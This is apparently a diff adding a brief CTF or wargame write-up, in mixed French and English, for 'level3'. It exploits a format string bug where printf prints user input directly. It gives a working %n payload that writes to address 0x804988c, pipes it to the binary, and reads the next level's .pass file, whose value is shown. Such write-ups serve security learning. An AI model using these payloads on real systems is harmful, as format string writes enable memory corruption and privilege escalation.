@@ -1,0 +1,16 @@
+le program rempli un buffer avec le contenue de stdin
+    fgets(local_20c, 512, stdin);
+
+et l'affiche avec printf dans son premier argument
+    printf(local_20c);
+
+we use le format %n pour ecrire dans la memoire
+
+\x8c\x98\x04\x08 == 0x804988c address to put value to 0x40
+\x8c\x98\x04\x08%60c print 64 char with printf then %n write 64 to a an address
+
+$ echo -e "\x8c\x98\x04\x08%60c%4\$nAAAAAAAAAAAAAAAA" > /tmp/level3_test
+
+$ cat /tmp/level3_test - | ./level3
+ $> cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
